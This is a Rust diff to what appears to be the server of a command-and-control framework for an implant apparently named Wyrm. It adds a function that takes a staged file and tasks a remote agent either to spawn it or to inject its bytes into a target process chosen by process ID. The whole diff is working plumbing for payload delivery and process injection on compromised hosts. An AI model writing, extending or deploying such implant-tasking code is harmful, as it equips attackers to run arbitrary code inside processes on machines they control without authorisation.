@@ -4,7 +4,7 @@ use axum::extract::State;
 use serde_json::Value;
 use shared::{
     task_types::DotExDataForImplant,
-    tasks::{Command, DotExInner},
+    tasks::{Command, DotExInner, InjectInnerForAdmin, InjectInnerForPayload},
 };
 
 use crate::{
@@ -36,4 +36,76 @@ pub async fn dotex(
     let _ = task_agent(Command::DotEx, Some(meta_ser), uid.unwrap(), state).await;
 
     None
+}
+
+type InternalName = String;
+
+/// Options for preparing the delivery of the inject inner payload
+pub enum SpawnInject {
+    Spawn(InternalName),
+    /// Inject options include the pid
+    Inject(InjectInnerForAdmin),
+}
+
+pub async fn spawn_inject_with_network_resource(
+    uid: Option<String>,
+    type_of: SpawnInject,
+    state: State<Arc<AppState>>,
+) -> Option<Value> {
+    let state_cl = state.clone();
+    let endpoints = {
+        let tmp = state_cl.endpoints.read().await;
+        tmp.clone()
+    };
+
+    let internal_name = match type_of {
+        SpawnInject::Spawn(ref s) => &s,
+        SpawnInject::Inject(ref inject_inner_for_admin) => &inject_inner_for_admin.download_name,
+    };
+
+    let file_data = match endpoints
+        .read_staged_file_by_file_name(&internal_name)
+        .await
+    {
+        Ok(buf) => buf,
+        Err(e) => {
+            let msg = format!("Failed to read file data for spawn/inject. {}", e);
+            log_error_async(&msg).await;
+            return None;
+        }
+    };
+
+    drop(endpoints);
+
+    match type_of {
+        SpawnInject::Spawn(_) => {
+            let ser = match serde_json::to_string(&file_data) {
+                Ok(s) => s,
+                Err(e) => {
+                    let msg = format!("Failed to serialise file data for spawn/inject. {}", e);
+                    log_error_async(&msg).await;
+                    return None;
+                }
+            };
+
+            task_agent::<String>(Command::Spawn, Some(ser), uid.unwrap(), state).await
+        }
+        SpawnInject::Inject(inner) => {
+            let constructed_for_wyrm = InjectInnerForPayload {
+                payload_bytes: file_data,
+                pid: inner.pid,
+            };
+
+            let ser = match serde_json::to_string(&constructed_for_wyrm) {
+                Ok(s) => s,
+                Err(e) => {
+                    let msg = format!("Failed to serialise file data for spawn/inject. {}", e);
+                    log_error_async(&msg).await;
+                    return None;
+                }
+            };
+
+            task_agent::<String>(Command::Inject, Some(ser), uid.unwrap(), state).await
+        }
+    }
 }
